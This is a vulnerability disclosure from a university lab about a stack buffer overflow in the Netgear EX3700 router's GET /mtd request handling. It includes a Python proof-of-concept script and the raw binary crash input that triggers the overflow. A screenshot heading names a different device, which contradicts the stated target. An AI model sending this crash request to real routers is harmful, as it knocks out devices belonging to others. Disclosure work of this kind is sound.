# Overview
Details of the vulnerability found in the netgear router ex3700.This vulnerability affects all firmware versions before 1.0.0.88.

| Firmware Name  | Firmware Version  | Download Link  |
| -------------- | ----------------- | -------------- |
| ex3700    | before 1.0.0.88    | https://www.downloads.netgear.com/files/GDC/EX3700/EX3700_EX3800-V1.0.0.88_1.0.58.zip   |




# Vulnerability details
## 1. Vulnerability trigger Location
A stack-based buffer overflow vulnerability exists in the function sub_41619C at offset 0x0041684C, where the strcat function is called without proper bounds checking. A specially crafted GET request can trigger the overflow.
![Vulnerability Trigger Location](./assets/1.png)

## 2. Vulnerability  Analysis
- The vulnerability is triggered during the parsing of a user's GET request when the request header contains `GET /mtd`.
![second](./assets/2.png)
- Since the program uses memset(&v22[6], 0, 94);, the maximum size of the v22 buffer is effectively limited to 100 bytes. Therefore, if the data following the GET request exceeds this limit, a stack-based buffer overflow can occur.


# POC
## python script
```python
import socket

host = "172.17.0.7"
port = 80
file = "../crashes/id0"
f = open(file, "rb")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

request = f.read()

s.send(request)

response = s.recv(4096)

print(response.decode())

s.close()
```
## id0

**Note the use of CRLF (Carriage Return and Line Feed) for line breaks.**
```
GET /mtd�������������������������t������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ggggggggggggggg������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������l M�Contdnt-Dispo�ibion:rl3
```

# Vulnerability Verification Screenshot
##  dcs-5020l-1.01_B2
![3.png](./assets/3.png)

# Discoverer
The vulnerability was discovered by Professor Wei Zhou's team (IoTS&P Lab) from the School of Cyber Science and Engineering at Huazhong University of Science and Technology.
